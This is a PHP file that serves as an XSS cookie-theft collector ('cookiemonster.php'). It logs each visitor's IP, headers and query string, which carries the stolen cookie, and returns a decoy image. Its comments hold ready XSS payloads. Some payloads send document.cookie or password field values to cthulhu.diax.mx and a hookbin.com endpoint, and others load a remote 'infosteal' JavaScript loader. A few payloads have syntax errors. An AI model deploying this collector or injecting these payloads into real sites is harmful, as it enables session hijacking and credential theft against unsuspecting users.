<?php
function GetIP()
{
	if (getenv("HTTP_CLIENT_IP") && strcasecmp(getenv("HTTP_CLIENT_IP"), "unknown"))
		$ip = getenv("HTTP_CLIENT_IP");
	else if (getenv("HTTP_X_FORWARDED_FOR") && strcasecmp(getenv("HTTP_X_FORWARDED_FOR"), "unknown"))
		$ip = getenv("HTTP_X_FORWARDED_FOR");
	else if (getenv("REMOTE_ADDR") && strcasecmp(getenv("REMOTE_ADDR"), "unknown"))
		$ip = getenv("REMOTE_ADDR");
	else if (isset($_SERVER['REMOTE_ADDR']) && $_SERVER['REMOTE_ADDR'] && strcasecmp($_SERVER['REMOTE_ADDR'], "unknown"))
		$ip = $_SERVER['REMOTE_ADDR'];
	else
		$ip = "unknown";
	return($ip);
}

function logData()
{
	$dataa = $_SERVER['QUERY_STRING'];
	$register_globals = (bool) ini_get('register_gobals');
	if ($register_globals) 
		$ip = getenv('REMOTE_ADDR');
	else 
		$ip = GetIP();
	$rem_port = $_SERVER['REMOTE_PORT'];
	$user_agent = $_SERVER['HTTP_USER_AGENT'];
	$rqst_method = $_SERVER['METHOD'];
	$rem_host = $_SERVER['REMOTE_HOST'];
	$referer = $_SERVER['HTTP_REFERER'];
	$date=date ("l dS of F Y h:i:s A");
	$filel="log.txt";
	$str="IP: $ip | PORT: $rem_port | HOST: $rem_host | Agent: $user_agent | METHOD: $rqst_method | REF: $referer | DATE: $date | DATA: $dataa \n";
	$tmp=file_get_contents($filel);
	file_put_contents ($filel, $tmp.$str);
	fclose($log);
}

function returnImage()
{
	$file_out = "cookiemonster.png";
	if (file_exists($file_out)) {
	   $image_info = getimagesize($file_out);
	   header('Content-Type: ' . $image_info['mime']);
	   header('Content-Length: ' . filesize($file_out));
	   readfile($file_out);
	}
	else { header($_SERVER["SERVER_PROTOCOL"] . " 404 Not Found"); }
}

logData();
returnImage();
# Llamar en web:
# <img src=. onerror="this.src='http://<site>/cookiemonster.php?cookie='+document.cookie;" />
#
/*
<script src=http://cthulhu.diax.mx/loader_infosteal_fetchAsync.js />

<iframe %00 src="http://cthulhu.diax.mx/loader_infosteal_fetchAsync.js"%00>
<svg><script x:href='http://cthulhu.diax.mx/loader_infosteal_fetchAsync.js' {Opera}

<img src=. onerror="this.src='http://cthulhu.diax.mx/loader_infosteal_fetchAsync.js " />

<img src="" onerror="i=document.createElement('105,102,114,97,109,101'); s.src='cthulhu.diax.mx/loader_infosteal_fetchAsync.js'; document.body.appendChild(i)">


<script>var fatake = document.getElementsbyName('password');new Image().src='https://hookbin.com/3Okg00Dkw0iEwwjBWeLL?'c=fatake.value;<script/>
<img src=. onerror="s=document.createElement('img');s.src='http://cthulhu.diax.mx/cookiemonster.php?cookie='+document.getElementsbyName('password');" >
<img src=. onerror="s=document.createElement('img');s.src='http://cthulhu.diax.mx/cookiemonster.php?cookie='+document.cookie;document.body.appendChild(s);" >

*/
?>